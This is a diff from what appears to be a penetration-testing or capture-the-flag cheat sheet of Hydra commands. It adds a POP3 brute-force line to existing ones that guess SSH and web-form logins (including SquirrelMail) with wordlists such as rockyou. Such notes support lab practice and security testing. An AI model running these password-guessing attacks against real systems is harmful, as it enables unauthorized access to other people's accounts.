@@ -42,4 +42,5 @@ hydra -l <username> -p <password> ssh://<ip>
 hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://$IP -o hydra.ssh.jake
 hydra -l john -P /usr/share/wordlists/rockyou.txt $IP -s 62337 http-post-form "/components/user/controller.php?action=authenticate:username=john&password=^PASS^:Incorrect Username or Password" -o hydra.http.john
 hydra -V -I -L usernames.txt -P log1.txt $IP  http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect." -o hydra.http
+hydra -I -L usernames.txt -P passwords.txt pop3://target.ip -t 64 -o hydra.pop3
 
